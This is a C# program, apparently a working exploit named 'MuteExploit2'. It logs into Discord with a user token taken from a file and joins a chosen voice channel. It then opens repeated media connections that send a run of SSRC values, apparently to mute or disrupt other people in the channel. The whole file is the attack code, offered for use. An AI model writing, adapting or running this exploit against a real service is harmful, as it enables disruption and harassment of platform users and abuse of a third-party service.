using Discord;
using Discord.Gateway;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace MuteExploit2
{
    internal class Program
    {
        private static DiscordMediaServer _server;

        private static ConcurrentQueue<DiscordMediaConnection> _connectionQueue = new ConcurrentQueue<DiscordMediaConnection>();

        static void Main(string[] args)
        {
            var client = new DiscordSocketClient(new DiscordSocketConfig() { HandleIncomingMediaData = false });
            client.OnMediaServer += Client_OnMediaServer;
            client.OnLoggedIn += Client_OnLoggedIn;
            client.Login(File.ReadAllText("Token.txt"));

            Thread.Sleep(-1);
        }

        private static void Client_OnLoggedIn(DiscordSocketClient client, LoginEventArgs args)
        {
            Console.WriteLine("Logged into " + client.User.ToString());

            Console.Write("Channel ID: ");
            ulong channelId = ulong.Parse(Console.ReadLine());

            try
            {
                var channel = (GuildChannel)client.GetChannel(channelId);
                client.GetVoiceClient(channel.Guild.Id).Connect(channel.Id);
            }
            catch (DiscordHttpException)
            {
                Console.WriteLine("Unknown channel");
            }
        }

        private static void Client_OnMediaServer(DiscordSocketClient client, DiscordMediaServer args)
        {
            Console.WriteLine("Got media server");
            _server = args;

            Task.Run(() => StartConnectionStarter(client));

            Task.Run(() =>
            {
                while (true)
                {
                    DiscordMediaConnection connection;
                    while (!_connectionQueue.TryDequeue(out connection))
                        Thread.Sleep(1);

                    connection.Authenticate = true;

                    while (connection.State < Discord.Media.MediaConnectionState.Ready)
                        Thread.Sleep(1);

                    Console.WriteLine("Sending SSRC's");

                    for (uint i = 0; i < 190; i++)
                    {
                        if (connection.State == Discord.Media.MediaConnectionState.Ready)
                        {
                            try
                            {
                                connection.SetSSRC(i);
                            }
                            catch (InvalidOperationException)
                            {
                                break;
                            }
                        }
                        else break;
                    }
                }
            });
        }

        private static void StartConnectionStarter(DiscordSocketClient client)
        {
            while (true)
            {
                if (_connectionQueue.Count < 3)
                {
                    var conn = new DiscordMediaConnection(client, _server.Guild.Id, _server);
                    Task.Run(() => conn.Connect());

                    _connectionQueue.Enqueue(conn);
                }
                else Thread.Sleep(100);
            }
        }
    }
}
